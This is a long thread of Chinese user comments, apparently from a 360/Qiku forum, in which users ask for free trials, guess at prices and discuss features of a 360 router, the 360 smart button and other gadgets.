这个路由器怎么跟小米盒子好像啊。我想试用，看看这个路由器会不会比小米所谓的路由更牛逼？
云下载功能比较实用，不用开电脑就能下影片
被它的造型深深吸引
好想要啊，给我一个呗
一个USB接口有点少，网线接口能多几个吗
酷赞了 超棒
可以在路由器里面加一个硬盘或者可以插随身wifi使用云盘功能，人在外面玩，也可以下载到云盘里面去。手机端只要登录就可以远程下载要随身wifi里面去
求试用。赞360！超新思维
目前入手了如意云和垃圾极路由，下个入手360，，如果能把安全卫士和杀毒安装在路由器里面就好了，那样电脑就能全速裸奔不占电脑内存，多好
希望可以支持802局域网，一如既往喜欢360
360路由器在侧边预留USB接口，能否与我公司的智能开关和插座配套结合，为未来路由器在智能家居中担任枢纽角色。
估计系统跟dd或者op或者番茄系统差不多功能吧，拭目以待！！
希望可以买到哦
希望可以买到啊
网速一定要快，不能卡死
希望可以买到啊
快点吧！家里没路由器，就憋着买你呢！
好的平台不应该是死板封闭的，她应该是活跃开放的！！
可不可以加上智能家居管理相关的可编辑扩展的APP，以利网友们发挥创造能力
就看看价格如何了，TP马甲战术已经所向无敌好多年了，但是产品是越做越坑。初代产品还能够16M FLASH 32MRAM组合，硬件版本更新到后面能够牛逼到1M FLASH 和8M RAM的组合，软件优化再牛逼硬件配置也不能这么吝啬啊。这款产品完全可以无视马甲FAST和水星，和TP中端相近的定位，发售的时候打算入手。
貌似没有回复功能，回复楼上的兄弟我所知道的问题，1根天线那是外置的，还有内置的呢。USB那是有的，肯定是2.0.FTP、SAMBA这些有了USB口应该都是有的，否则要这个USB口干啥呢。单线多拨，这个还是自己折腾吧或者后期以插件方式安装，官方版本加这些电信运营商肯定要疯掉的，再说了，这种功能还是低调点，搞得动静大了，电信给封了自己都没得折腾了。
期待 中，，，，，，
为啥就1根天线？AC，至少双收双发不？USB有木有？USB至少2.0以上吧？托硬盘不成问题吧？脱机下载必须有吧，FTP,SAMBA,DLNA,必须有吧？单线多拨，多线多拨，多线叠加，得有吧？如果你是基于OPENWRT定制，你肯定得有。
期待期待，希望买一个
我很期待啊！！谢谢360
USB接口是不是代表可以使用wlan接收设备呢 期待中...
360的一定快！
我家的路由器不说了。。。。期待啊。
很期待，传统的路由器太简陋了。
什么时候试用。期待着这个
坐等路由器！！快点吧！！
什么时候开始啊，好期待
360的产品好用实惠，很期待！
什么时候试用。期待着那个
不错的东东，外观新颖
个人认为体积可以再小点！！做成便于携带的！那样可以发挥它更大的作用！
太棒了啥时候试用啊
我的手机和电脑全是360的软件和权限管理 360磊科第二代安全路由器能免费试试吗
期待试用啊
我没有用过，什么时候能给我免费试试啊！
哇塞，非常期待的说
360的产品的确好，我的朋友说是很贵，我认为还比较合理。我用的是360磊科第二代安全路由器，方便实用。如果这款定价合理的话我还会买这一新款新产品。【其待早日定价】【我的手机和电脑全是360的软件和权限管理】
能免费试试吗
给我免费试试吧。…。…。……....
不是TP-Link就是D-Link的玩意，除了固化了360的软件，其它的没有亮点，都不敢拆机，不敢搞透明外盒，基本上也就是个百元以内的低档货色！
不行，我忍不住了，啥时候能给我免费试试啊！
360路由器的外观设计为什么不能创新点，比如和台灯、闹钟等一体的，非得和别人一样吗？家里插排都插满了。
我就喜欢高科技，方便大众，提高生活的质量，娱乐精神，十分感谢创作人员，我也真的希望我也能假如这样的团队，发挥自己的价值
期待免费试试.
看上去不错，真的可以领取试用吗?拭目以待！
东西非常不错我喜欢 360VIP可以免费领取吗
期待中，希望快点推出！
是免费的么 给我来个 来个惊喜！！
什么时候开放、我求购买 。 真是期待功能的完美！
希望给我一个惊喜，所有的360产品都喜欢，真的做到每一项比较人性化...
感觉不错，啥时上市啊。
能免费试用吗
怎么领取试用？
求试用...
真的有那么好吗？可以领取试用吗？给我来一个试用。
看着不错，高端，就看丢包率等怎么样了
给我一个，让我家的网速恢复正常，我现在的网速超级坑爹
在那里可以买到呢！
精品、精品，工学好美啊
补：对了，路由器（无线）首要的就是信号了，要是这都做得完美了，将是天下之福也！
您这样的描述，还能是什么，简直要媲美“天工”了，期待啊！@奇虎360
不错啊 很期待
预留了一个USB接口,可插移动硬盘、U盘，还可以……，期待更多更好的惊喜。建议再加一个天线，信号更强。
哈哈，支持。没有做不到，只有想不道。
求试用啊。
之前的版本是磊科代工的
360出品，必属精品。
360出品，必属高级品。
如果这东西具有自动关闭电源功能就好了，睡觉的时候可以通过手机遥控关掉或设置好时间自动关掉，不仅能减少辐射，而且也可以减少自己的上网时间，保护视力，提高睡眠质量
有试用吗？
天哪天哪天哪天哪！！！我一定要买！！
不知道这东西卖多少钱？
可以试用吗
哈哈，好，支持！
看看有什么别样功能！期待有新的改进和新的功能。要能超出现在的功能就好。
再不怕蹭网了，希望有方便随时开关WIFI的功能。
有USB 必须下载器啊
防PIN必须的吧。。。可以做中继路由使用，增强信号发射与接收。。
好期待哦 支持
哎妈呀好激动，，终于出路由器了。。之前的wifi缺点就是一定得开着电脑。。好难过。。
想要啊....
一样没有抢到~！~！
高端大气上档次啊
快点吧，很期待哦！！！
高端大气上档次 如果天线是可拆卸形式的 就完美了 乐趣更多！
期待中 也期待 不要太贵
支持360，期待！
挺期待的，上次申请试用都没有抢到名额
看外形就听高端啊
支持 期待
希望可以尽快开卖，内测了两把我都没抽到。
主要的就是传输距离，还有稳定性。
支持早点出来
这个路由器能和小米路由器一样有1元抢购资格吗？最大特点是什么，可以超过小米路由器吗？
支持 期待中
发烧级别的吧
拭目以待 啊支持360
什么时候上市啊？都期待几个月了。
真心想要啊 支持360
这已经不是一个理念了,而是一个现实...
很想使用一把 但是不知道 试用有没有什么条件限制 期待能成为360的试用用户 我是360的忠实用户的
支持 期待中
我也很期待~
这个比小米的推出得太晚了！一定要做好啊！不要像小米一样学咱360搞了个miwifi，但是功能太差！极难用！成了个笑话！哈哈哈！他们论坛全是在诉苦的！
鼎力支持360，她为国民做了一件性能卓越的好产品。
支持360.挺你到底
很期待，希望又是一款巅峰之作！
360的忠实粉丝，呵呵，期待送我一个，
期待早点面市
我特别喜欢。期待送我一台吧
看来寝室的路由器该换了
怎样看都比我现在的路由器好！喜欢
很喜欢。期待
必须为360用户发烧一下 支持
期待送我一台吧
好想要！！！
看起来很酷的样子！！
希望快点收到。。。。。
这个路由器会不会有免费试用啊。
能不能不天线那个大犄角不要露在外边哦～
外观不错吖
期待，路由器发烧友......
看着不错，很喜欢。期待
外观看上去很眼熟，下一款产品该是360安全 套了，主打安全嘛。
外观不错吖，只看功能咋样喽
我猜价格是99元
期待，路由器发烧友......
思科也在关注！
期待 远程控制 上网控制 简易化
我是你们用户，很想有360这样的无线路由器，360是我最喜欢的一个产品，360我看好你们，我每天都在关注360的变化，360每天在不断在发展中，希望我能申请到你们的产品，谢谢，我的用户是1343080442
很开心中了内测 等待发货呢
估计价格100――150
怎么没有价格呢
很期待，希望这一次360会再次带来一个大惊喜，心潮澎湃呀！！！！！
简洁美观大气，希望能申请到试用
估计360的产品应该不会很贵。很期待啊。奇酷网能有试用和售卖的货吗。
期待360安全路由器
哦想要啊！到现在都没抢到一个！
非常期待子路由的产品，家中有信号死角，没有好的解决办法。强烈期待中
360安全路由器可以进一步扩展，由传统的上网安全扩展为家庭安全等，通过扩展变为家庭物联网的网关节点。通过扩展Zigbee或者低功耗蓝牙模块，扩展外围传感器实现家庭安全功能。 硬件性能足够文件多媒体共享还是需要的，USB接口接移动硬盘之类的作为家庭网络存储，没必要像小米路由那样内置硬盘。
看样子应该很强大！
真的很好看啊，不错。。正好我家的路由需要换代了。。期待360路由
非常期待这款路由器，想尝试360的sos安全系统，不喜欢花哨得配置！
路由器本身的外置天线取消掉吧，改用内置陶瓷天线，这样不仅美观，还有利于家居摆放。另外希望我能够加入到评测。会给这款产品带来不一样的用户体验。
很简洁，功能很强大，然是既然叫安全路由器，那到底那里比较安全呢？比传统的路由器又有什么优势呢？值得期待。
就看价格了
这个USB口大概是接入3G或4G无线上网卡用
东西都很好 创意很新颖。理念很创新。设想很大胆。是一个走的久远的公司 ，会很有发展前景和方向的
这个也可以试用吗
好厉害的。。。
好东西啊 太棒了
跟新蒙迪欧差不多么 哈哈哈
酷，能用上就更酷了
胆子小的人还真不敢用
可以当房车用吗
科技在发展,只有想不到，没有做不到，赞！
好东西，没钱买，
空间大，屏幕大，那啥确实好啊。什么时候上市呢？
赞啊，以后的趋势
好厉害哦，希望越来越好
什么时候出来告诉一声，肯定购买
真想有一个，不用有时候找东西都要半个小时
期盼 能有更新的产品
什么时候可以出来
期盼了很久的东西 到底什么时候可以出来啊！！
都还是概念图，谁都不知道iWatch会长啥样，但肯定和健康捆绑的，
这么价格多少大概|？
iWatch 我等了好几年了~
如果不贵的话，超级想买这个手表。
默默等待、
哇哦.好东西.期待
赞一个，功能貌似很强大，期待啊 ~
我要 ！！
看着不错啊！！！
真的很期待，光外表就吸引我了
这个好，功能很强大，什么时候才可以买到？很期待啊。
这个好。不知道有效传输距离有多远。
便捷生活从你开始哦。
真心的实用！真想有一个，不用有时候找东西都要半个小时
真心的实用！
真心的实用
真心的实用
这个对于我来说真心的实用啊！
十年前已经使用钱包卫士，只不过没有蓝牙功能，仅仅是靠光线控制
4月底发货吧？
真想有一个，不用有时候找东西都要半个小时
什么时候发货啊
支持安卓4.3的带蓝牙4.0的其他品牌手机。
其他安卓手机可以支持吗？
老婆每天都要找手机、钥匙、钱包等若干遍，真是又气又心疼，真希望逃出找东西的怪圈。不知道该如何申请试用呢？
如果价格也有吸引力还是不错的东西，否则出门前请默念“伸手要钱”来提醒带好你的身份证、手机、钥匙和钱包吧。
我想给妈妈要一个
我搞医疗的，这款 必须的必
一方面非常符合现在中国消费心理，但另一方面我国在医疗保障上很不健全，绝大部分人，就算是趁个几千万的富人，也很少有自己的私人医生，产品的更大用处是让私人医生随时掌握自己的健康状况，保持身体健康，这一下子让该产品在国内失色大半。
啥时候能试用一下呀
这款设备是什么时候上市尼，好实用
医疗健康确实是一个很好的市场。生活水平提高了，加上很多人不知道买什么东西回馈老人，这时候这种产品就比较容易吸引眼球了。
很时尚，可以为家里老人准备一份。
这个创意产品既有新意有时尚，为家里人的健康多一份检测的途径，家用很好啊，支持！
看好产品的未来市场！
现在人们的生活水平越来越高了，然后疾病也越来越多了，只能的健康医疗以后会是家庭必备的必需品，以后老爸老妈就可以随时自己检查身体了
智能的健康医疗设备开发，支持！
智能的健康医疗，看来以后会更有市场啊。
占地方有点大啊，建议弄个USB口搞个无线适配器
这也太贵了。
好想知道有多智能！
这也太贵了。
好贵，想买，送一个测试一下
我家人很想买一台，如果无法获取资格就自己买一台送她
好看真是好看
5寸以下的屏才差不多 无边框不喜欢 到时握在手上都碰屏幕
一摔。。。。HA-HA
如果iphone6还是这样我就不入了....
要是全透明的就更好了
我喜欢...
我要买最大尺寸的IPhone~
如果iphone6还是这样我就不入了....
也不知道无边框的iphone能不能实现啊。
这个设计图估计是做在iPhone5S之前，iPhone6不太可能在丢掉5S上那革命性的指纹传感器了吧。
感觉没有边框挺帅的
我一直在等iPhone7。
我想看看是360安全卫士定位好还是你们这个产品好！
有毛用！~
不方便啊！绝大多数城市没有普及充电站。这就是个摆设。在家用，还要借助这么大个板板。还不如1根数据线来的快。再改进下吧
没有特别的地方啊
难道我充电的时候还要带上这个绿色大板子，如果这样还不如充电宝呢
这就是废物，我的Nexus5就支持无线充电，现在很多很多旗舰机都支持无线充电，两年后这东西肯定灭绝。
这玩意儿充电还要把手机放在感应区，如果拿开就不充电，算什么无线？
这东西太方便了，发展起来绝对带动整个无线充电行业。
很新奇实用的东西，申请实用，会奉上一份实实在在的试用报告。
送我一个试用吧！
好笼统啊。应该有一个使用指南图片或者视频。光看那几张图片看不出什么来
试用的来一发
这个很棒啊，如果可以实现无线充电或者太阳能充电更完美
申请试用 谢谢支持
造型很酷，就是不知道电池续航能力怎么样！
就是不知道能不能送一对
酷 能得到试用就好了
好想要，跑步时候戴有线的很不方便，不知道这个感觉怎么样，好想试用，求试用
不知道音效怎样 360真实原来越广了啊 申请适用
能试用么，太酷了
申请试用 谢谢
创意很不错。。。。不过电池怎么办？？？
申请试用，我会用一份责任心来送上我的试用报告。
送我一个试用吧
这个耳朵，聋人永远比健全人更需要。
太贵了。难以大量使用啊
确实太贵了！！
贵，外观不是很出色。
有点贵啊~
黑，，，，，，
确实很不错，就是价格太贵了。
定价太高了点，200块以内可以。
看起来不错，体验或感觉一下。
棒！就是太贵了
贵，外观不是很出色。
感觉很好,有点贵
的确贵了，我看到的时候 我以为是 中间是 摄像头 是。可惜不是。是的话 可以通过那里关注家里的一切。哈哈
确实有点贵。。。
这个感觉很酷 考虑买一个试试！
交流交流交流交流老简
如何赞助？
这个东西还挺方便的啊。创意很不错啊。
希望可以得到试用的机会
你们想干什么？
呵呵，类似与OPPO那个小叮当
很期待这一款产品，希望价格不要太高
安逸 我喜欢钓鱼 可以来个我试用一下嘛 呵呵 我的钓友很多哦
又是抄板货？
很不错的玩意，如果能做出来就更好了
期待........
好玩！！！
让我想起了《纸人》里面那架（群）呆萌的小飞机^_^
这个好玩啊
贵了点吧，一个纸飞机。。。。
现在缺的就是这个东东，家里的音箱又可以发威了！
现在缺的就是这个东东，家里的音箱又可以发威了！
现在缺的就是这个东东，家里的音箱又可以发威了！
好像是很不错吧 老古董音响继续飞跃了 现在可以无线(限)发烧了！！！
好想有~!
很期待这个产品
不错啊怎么评测啊
我简单介绍一下思维车，算科普吧。思维车是通过人站在上面的前倾，后倾，左倾，右倾和倾斜的角度来控制思维车的行驶。
有没有遥控版的呢？如果有的话就牛B了
这产品很牛逼啊，真心期待啊。要是有个良好的价格就好了！
是不是有陀螺仪和重力感应芯片，加速度感应器？
哈哈。没错。可以试用的话，可以考虑
这个不错啊，双轮的应该比单轮的稳定吧
要是能试用过，我才会考虑买！
这个属于自行车还是电动车？能上牌吗？
看到北京街头有人踩着跑，很有趣，就是不知道好不好掌握。。。。
高富帅的玩具，
不错的东西啊，就是价格不知道能不能接受啊！
土豪的玩具
太贵了，土豪的玩具。
赞。顶一个。
太贵了，，，，
03.可变形曲面屏手机Limbo，这手表太酷了！什么时候能上市呢？
这种智能手表要考虑用电方面！
怎么评测啊啊啊啊
我试用！！！
有没有试用？给我试试 好玩不先
可以定时吗，或定时模仿天空渐亮或渐暗吗
200多买个灯泡？能买N个节能灯泡了！
感觉贵了点。
没智能手机就没什么用了
智能产品预来预新潮。
这么贵一个灯泡？这个成本估计100以内。主要主要是灯罩，PCB， 什么都没介绍，支持开关吗？
智能家居的影响 灯泡、插座这类产品会率先德奥普及..
希望可以得到试用
这样有什么看头 没意思！！！！
这个设计早就有了吧
样子多一点就好了
下代USB不是要不分正反了，这个产品能存活多长时间？
容量有多大啊？
早就有双插入的了，我在同学那见过。
很不错的创意
是很好的一个细节上的改变，只是不知道这个设计在内部电路设计上如何，USB接口内部是金属，需要防止一面插入的时候另一面的金属触点和USB接口外壳接触导致短路，查了类似的专利有很多，很多是外观设计专利，找到的一个实用新型专利也仅仅是外观上做了定义，这个问题怎么解决并没有说明。这个U盘确实很不错。以后就不用管正反面了。而且颜色也很漂亮。细节改变生活 习惯挖掘需求
是很好的一个细节上的改变，只是不知道这个设计在内部电路设计上如何，USB接口内部是金属，需要防止一面插入的时候另一面的金属触点和USB接口外壳接触导致短路，查了类似的专利有很多，很多是外观设计专利，找到的一个实用新型专利也仅仅是外观上做了定义，这个问题怎么解决并没有说明。
这个U盘确实很不错。以后就不用管正反面了。而且颜色也很漂亮。
细节改变生活 习惯挖掘需求
手机变大了 话说回来，但是我们的安卓怎么办
感觉不是很方便啊！而且有点臃肿
既然充电还需要摘掉不方便，要么就把无线充电也做进去，成本不会增加多少，也带来了更大的实用价值，要么就在引出一个接口，不让总是插拔也郁闷的。
这是给南极或者恶劣环境的人准备的吧
样子好看 参数也可以 希望可以得到试用的机会
稍微讲究点音质的印象需要音腔设计，这恰恰需要空间，追求便携的话音质上需要点妥协，移动电源感觉更像是附加功能。
太大了，不方便
期待中。。。。。。
有体验不？好期待。。。
无限期待中.
不知道什么价位啊
真的是的不错的好创意，喜欢并更支持能有更加有新威创意和新概念！
iwatch一出一定很震撼吧
真是一个好主意
要真是这样就酷毕了
就这功能也做腕带，太天真了吧
老年人最不需要补水提示了
超市已在卖
我只想问怎么换电池！！！！
等普及吧~现在太贵~~
哎、都不是我这种穷人的菜
东西是好啊，但价格...........
东西是好，但价格实在承受不了！
关注此产品！一万多太贵了
一万多块钱买个自行车？太黑了吧
没有最贵，只有最黑 ~~
1W多，我去。能买个15手捷达开了。还风吹不着，雨淋不着。
这么快的速度，还没有个，前后车瓦，碰上个阴天小雨啥的。还不崩的前脸后背都是泥巴点点撒！
一万多一台电动车........太贵了～～～
期待期待期待期待
价格无优势，希望做为一个排头兵，打开市场剧面后，其它厂商迅速跟进推出相似产品，把价格压至2000元以下。
这附加费用...太高了
就是哑光黑的颜色设计比较亮眼 这价格，，也亮眼
一万多块钱买个自行车？太黑了吧 我还不如买个摩托
前提是：你家得有一台中央空调！
家里的地暖它也能管吗？
看着就舒服，把一个经常被忽略的开关都能做成一个艺术品。看了拆解纳闷一个问题，这货为啥还需要电池，已经装在墙上了，而且是智能学习最后可以让你忽略它的产品直接从墙上取电不是更好，还是我看的拆解里面没有说明这一点？
看着不错~
这个东西挺好。国外能用。国内还用不了啊。
再便宜点吧
现在预定的话，大概什么时候发货呢，亲
价格不是有点高，是很高！高大上吖！我等
价格有点高，另外杯子的材质是否能承受热水？
众筹过百万 最近架势很火啊..
现在都是高科技年代，怎么还搞个蓝牙连接。
哈哈！我有ipad！用这个手柄玩的话一定很爽啊
好牛的玩意儿！
希望选到我啊
谢谢你们选到我了，还没收到，收到会仔细认真评测的
不错哈，我也是申请成功了，东西已经收到了谢谢啊
我也中奖了，今天就收到货了，很激动。会好好体验使用，提交详细的报告
哈哈，中奖啦！谢谢你们!连原本不好的心情都跟着变好啦
刚刚收到信息说试用成功了，激动中・・・
没有资格试用 什么时候可以买哟 这个小东西实在好
不错 希望快快能收到啊 今天发短信说试用成功 让注意查收 那是激动啊
谢谢小编~~选到我啦~~
今天刚收到消息被选中。。。很有一种中了彩票的感觉。。弱弱的问句，到时候怎么还？
现在还有活动吗？我 好期待啊。
什么时候开放购买阿？
自己没通过~~期待好高哦~。，，也不知道什么时候可以公测预定购买？
已经结束了啊？本来挺期待的啊
好幸运啊 没有想到选上了 感谢奇酷 感谢小编 辛苦啦
获奖感言都准备好了，既然没通过！！！！！
没选上，真无语，等待这么多天
伤心。。。没选上
失落无语中。没成为幸运儿。好想试用啊。。。。。。。。。。
好想试用一下,很期待啊
哈哈选上了，等待寄到家，然后告诉大家使用心得。。
试用产品没给试用~~~~~~无语
好想试用一下！
360从杀毒软件开始后真是让我们的生活发生翻天覆地的变化，，
审核没过，啊...... 下次努力
怎么还不到时间呢
怎么还不到时间呢
期待ing 求人品
期待ing 求人品
期待ing 求人品
好期待！！！！
坑爹啊 到现在还在筛选 直接选我不就行了嘛
什么时候发布名单？好想看看有没有我？
什么时候发布名单？好想看看有没有我？
什么时候发布名单？好想看看有没有我？
什么时候发布名单？
都可以呀 以后智能化时代大家都是受益者呀~
不知道价位如何，好不好用呢？？？希望可以能试用一下宝贝，体验一把。呵呵！
不知道价位如何，好不好用呢？？？希望可以能试用一下宝贝，体验一把。呵呵！
不知道价位如何，好不好用呢？？？希望可以能试用一下宝贝，体验一把。呵呵！
不知道价位如何，好不好用呢？？？希望可以能试用一下宝贝，体验一把。呵呵！
希望可以能试用一下宝贝，体验一把。呵呵！
希望可以能试用一下宝贝，体验一把。呵呵！
希望可以能试用一下宝贝，体验一把。呵呵！
希望可以能试用一下宝贝，体验一把。呵呵！
什么时候开始官方购买阿？
什么时候开始官方购买阿？
什么时候开始官方购买阿？
快点大量推出
很厉害啊 快点推出
很厉害啊 快点推出
很厉害啊 快点推出
很厉害啊 快点推出
什么时候还以申请试用呢？好像试用一下
什么时候还以申请试用呢？好像试用一下
什么时候还以申请试用呢？好像试用一下
什么时候还以申请试用呢？好像试用一下
好想要一个啊，高大上的感觉。。。
好想要一个啊，高大上的感觉。。。
以申请 希望有试用
希望有抽到~
希望有抽中啊~
希望又抽中啊~
希望又抽中啊~
盼望能审核通过，我那home键损坏的手机已经等不及了……
盼望能审核通过，我那home键损坏的手机已经等不及了……
好想有一个哦，，，，
好想有一个哦，，，，
刚换了个新手机，希望给我带来好运，试用成功，认真评价。
不知道什么时候能够审核通过？好像试用一下
好，我好想试用一下！
不知道什么时候能够审核通过，我也好想试用一下！
不知道什么时候能够审核通过，我也好想试用一下！
申请已经提交，好期待的赶脚
不知道什么时候能够审核通过？好像试用一下！
我也想试用~能选上么？
已经申请，等待.....哈哈
什么时间可以买啊，等的花都谢了
淘宝上不是有了么 用了一下 还不错
很期待啊，希望能拥有
怎么申请试用呢？
360智键终于上市了，让我等到好苦。好可以自己拥有一个，不知明天我这样好运。好想要...！ 个360智键我前几天看见到我的朋友在用了。一开始我就觉得奇怪他手机早两没流。还拿手机上网看电脑真老弊，原来他叫他姐深圳那边买了一个360智键都不随便买多一个回。他娜娜的真够朋友，气得我恨不得从中山飞过深圳买几打360智键回来把它吃！
这东西太有创意了，太牛了！
怎么申请试用啊？我想报名
想要啊，希望可以方便我的生活
必须力定呐
很不错的产品，期待能够拥有
我想也试用一下
很有创意啊
我可以试用的话，可以在我的员工和孩子家长中大力推广，
支持360，希望360越变越好》
明天就可以查看能否拥有了
不错的产品 很喜欢 谢谢
360wifi、很好。，一直在用，希望这次的使用能给我一个机会，苹果手机HOME键不好用了，有了奇酷智能键，就能省略HOME键的使用频率。希望能给我一个，谢谢
再不开始卖大家都老了。
我很喜欢360智键，虽然现在还没拥有，但是看了效果图，感觉太好了，我现在有个360wifi，可以把360wifi的防尘塞换成智键，如果智键可以颜色多样化，一键连接360随身WiFi，不用输入wifi密码直接进入就更好了，希望获得360智键，一定要抽中我呀！
支持三六零。
关注很久了 什么时间能用上啊
关注很久了 什么时间能用上啊
好神奇的玩意
怎么申请使用啊！！！？？？？？？？？
希望能送一个试用啊
感觉不错，希望可以体验一下，提供更好的建议
求体验，一直觉得360的东西实惠好用
要是可以再加一个指纹识别就能牛了，可以加密手机中你懂得的东西，保护隐私
你们敢不敢送我一个?
有了这些简捷的高科技，生活更美好 更方便 哈哈 希望能先体会一下
抓拍更迅速啦哈
大爱 智键
产品不错 希望能够优先体验一下
这个什么时候出来啊~
支持360，皇上娘娘赏个我吧
期待盼望 是非常的渴望
什么时候出呢，在淘宝已经交定金预定2个了。
非常期待！！！！！一定要选中我啊！！！！！！
要是带红外遥控功能就好了，安装app可以遥控家电
一直喜欢360的产品，此智键及天人之物啊，一大创新，想出来的设计师令好多小伙伴们都惊呆了。已申请，期待选中我。yes!
一键求救？应该开发这东西，这玩意可能更有用，最好能不必说话直接求救，而且把求救地址发出去。不过必须防止误触。
跪求w(?Д?)w
跪求啊 哎 （ps 这是一个夜盲症患者急切迫切的渴求）
支持360，皇上娘娘赏个我吧
求个我一个，我的三星home键都快摁烂了
不要跳票啊，已经三月了~~~快按钮都已经出来了
一键直达的万能键，真厉害！一键直达的万能键，真厉害！一键直达的万能键，真厉害！
一键直达的万能键，真厉害!希望我能选上
一键直达的万能键，真厉害！这么简单操作，用不着开机找来找去太繁琐，能不省心吗？
给我一个吧
怎么申请啊
超喜欢，给我一个吧
我也申请一个，可以吗
超赞啊， 给我个，
好东西希望能给持之以恒使用３６０的人。
还可以申请吗？
希望能用上
希望我快快被选上
我想试用！！！！！！！！！！！！！！！！！
发工单法国
CHAO ZAN SUAN WO YI GE
希望能用上，好期待呀。
超赞啊， 给我个，，
很期待。。。
我是360忠实的粉丝，希望能被选中
感觉很不错啊,希望能被选中
啊们，试用一定要选中我吆
支持360的产品！
期待盼望 是非常的渴望
这个一定要顶！希望我能幸运的得到试用机会“360神钉”
这个好，期待我能被选中使用。
期待哦，(*^__^*) 嘻嘻……希望不要只看论坛贡献额。我刚刚开始玩360论坛呢。不过以前和360通过其它渠道有接触滴。
en ,xiwangdedaoshiyongjihui
期待试用 超级想要啊
期待试用！
第一次申请！希望可以成功！希望成为一个通过米3去使用它的人
360，顶你.....
一定要玩玩
创新性太强太赞了，希望我能幸运的得到试用机会
这个一定要顶！
来一个试试.性能如何
暂且我们叫他“360神钉”-- 一头大一头小，圆溜溜，亮晶晶，功能神奇，新颖别致，就像一颗神钉！
这个一定要顶
360的忠诚用户，360，顶你......
看起来真的不错，相信效果也一定不错，和以前的360WiFi一样，都有很大的用处
给力呀，支持，怎么申请试用呀，我也要！！！
来一个试试.性能如何？我想要啊啊啊啊.
很不错，但愿抽到我
拍照和录音怎么区别，用了才知道
360太给力了！
很想试用一下
看起来很不错，喜欢！
想要一个 好
试试看，性能如何？
我想要啊啊啊啊
这个一定要顶！360太给力了！
共有七项贴心功能，包含：智键相机，闪拍，手机加速，手电筒，录音，Home键和自定义。根据用户的反馈和需求，360智键会不断优化功能，快速迭代，给用户更多快捷舒适的体验。鄙人希望能得到申请
这个绝对是高尚大啊~！哇哈哈哈！！支持
360永远的支持者
这个一定要顶！360太给力了！
来一个试试
唤醒屏幕的那个键用的最多，一键唤醒就好了，再也不怕按键用坏了。
想要一个！
各种期待啊！！！希望能得到试用的机会！！支持360做出更多这种产品
一键就做这麽多，轻省快捷好硬件！我就试试用，更有发言权！
希望360会推出更好的硬件产品 360WiFi二代就是很好的范例 期待360智键 我也是360的老用户了 还记得很多年以前360在电视上的广告 第一款不收费的杀毒软件 现如今360不止是杀毒软件 更是一个品牌 希望我的申请通过
不错。。我是做手机行业的感觉就是不错。顶啦。。。希望能有机会免费试用。。。。。
希望360会推出更好的硬件产品 360WiFi二代就是很好的范例 期待360智键 我也是360的老用户了 还记得很多年以前360在电视上的广告 第一款不收费的杀毒软件 现如今360不止是杀毒软件 更是一个品牌 希望我的申请通过
360粉丝、绝对支持
这个可以有
我想要，怎么申请
如果想用耳机了，是不是还要先把它拔出来，能不能互不影响呢
我是360的老用户了，不管是pc浏览器，安全卫士，360杀毒，影视，手机卫士，手机浏览器，产品真的很好用，希望360产品越来越好，同时我也希望获得免费使用360智键的资格，谢谢了
我要我要我要
好神奇啊，也是好东西，想要一个！
我是360的老用户了，不管是pc浏览器，安全卫士，360杀毒，影视，手机卫士，手机浏览器，产品真的很好用，希望360产品越来越好，同时我也希望获得免费使用360智键的资格，谢谢了
真的不错，期待中。。。。。。
神奇在手啊。就是不知道技术成熟不。。。
有意思想试一试。
我也想试用
不信有这么强大的功能，不会是鸡肋吧
期待很久了，给我速度点
方便是方便，有没有不小心按到的可能
小东西大能量，万分期待中！！！
非常希望能获得免费试用机会呀~
很想试用，希望选中
其实这个早就有了，淘宝有卖，叫快按钮，但是不成熟
特喜欢，支持360.。
非常不错的想象力，有创意，我喜欢
360wifi我购了两个，不错。这东西可以试试。
期待更多功能
我好想试试啊！
高端大气上档次，期待中。
期待啊，希望可以选中
好东西一定要点赞！！还要顶起来：） 我的手机它期待被虐
好想试试迫不及待360就是好
非常期待啊
很好，很好，很好，很好，
耳机插头的大小吧？看起来很好啊
不错有点意思。
看起来很不错，很经典，很时尚。。。。
非常期待啊！感觉很实用
我好想试试
已经申请，期待能否中。。。。。
希望很好用
看起来很不错，很经典，很时尚。。。。
怎样申请 啊
应该很不错啊。很期待的。加油
可惜iphone4s不能用
很厉害的样子！好期待哦……
期待ing……
期待。期待。好期待啊
安卓的HOME键我不担心，我担心的是我苹果手机的HOME键啊
感觉不错期待中。
很不错的东东
之前发布360随时wifi的时候买过，还不错
什么时候出IOS系统的
期待啊 真的不错
自己买了两个 感觉不是很好的
自从有了360随身WIFI 2的方便，这个也是超乎想象的智能。
很喜欢，就是不知道怎么申请啊
哇塞，看着好好哦，nice，真的好想体验一下呢
强大吗？期待试用中
一个创意一个惊喜，人类社会就是在这种情况下进步的。
看起来不错的的样子，想得到一个
马上中奖哦
看起来很强大啊 真心想体验一下效果
已经填了申请，才发现，3月18日是我生日，不知道能不能在我生日的那天有一个惊喜呢？？？
我艹，真牛B
看上去很强大的样子 不知道功能是不是像以上说的那样 买过360随身wifi一代 用上去还不错 所以对360比较有信心 支持！
360的东东很不错
这个 产品很强大，后期软件开发这块，希望能自定义运行 某个程序。。。
360团队开发好前卫啊！不错啊，希望可以作为试用者，感受360新科技的魅力！
360从单一的安全走向安全人性化
自从有了360随身WIFI 2的方便，这个也是超乎想象的智能。
快发布吧 等着呢
这个都想到了，够强
稀罕，希望可以做这个第一批实验者！支持360！
看起来很强大的样子，但是真的有那么的方便吗？会不会出现误按的现象？
好人一生平安。
怎么申请啊？？？？？
surprise
如何申请试用啊？？？？
你是我心中的偶像360团队。
神奇的360，神奇的好玩意！！
好像很强大啊，可以试用吗？
很期待，看好360
是不是要狂抢那种
什么时候发布呀上午等到现在了
怎么才能试用
真实好东西啊
如何免费申请试用
看上去，可以试试
好期待试用，希望有资格。
好期待！感觉好神奇啊！
怎么申请试用呢~~
貌似很厉害，期待中
真有这样的东西吗
期待中。。。。。
好像很厉害的样子！！！！！！
有使用资格吗，期待
我好想体验一下！
创新，消费者有福了。
很棒的样子啊！！
期待・能试用一下就好了
能让我免费试用吗？
看上去很不错、很神奇的样子！！我最喜欢高科技的东西了，真心希望能够试用一下！！
期待・ 真神奇！
不明觉厉啊
看着很好 能试用一下就好了
期待..........
好期待啊！！！想试试
十分期待奇虎的新产品~
很不错的样子！！！
感觉很神奇，希望有机会试试,zhenshi很好的创意.
看着就激动，这玩意好像很给力啊
期待中，希望我能试用一下！
这个不错，可以加快速度，节省手机物理损耗，但是它是怎么实现快速了解需要开启什么功能的呢？
真的有这些功能吗？
期待~~~很有创意的小玩意儿~~~
期待中，很好的创意。
看起来感觉不错
期待呀..
